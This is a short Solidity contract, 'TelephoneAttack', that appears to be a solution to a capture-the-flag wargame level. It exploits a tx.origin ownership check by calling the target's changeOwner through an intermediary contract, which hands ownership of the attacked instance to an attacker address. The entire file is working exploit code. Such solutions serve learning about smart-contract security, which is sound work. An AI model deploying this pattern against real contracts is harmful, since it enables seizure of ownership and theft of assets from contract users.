// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address public attackerAddress;
    address public instanceToAttack;

    constructor(address _attackerAddress, address _instanceToAttack) {
        attackerAddress = _attackerAddress;
        instanceToAttack = _instanceToAttack;
    }

    function attack() public{
        Telephone(instanceToAttack).changeOwner(attackerAddress);
    }

}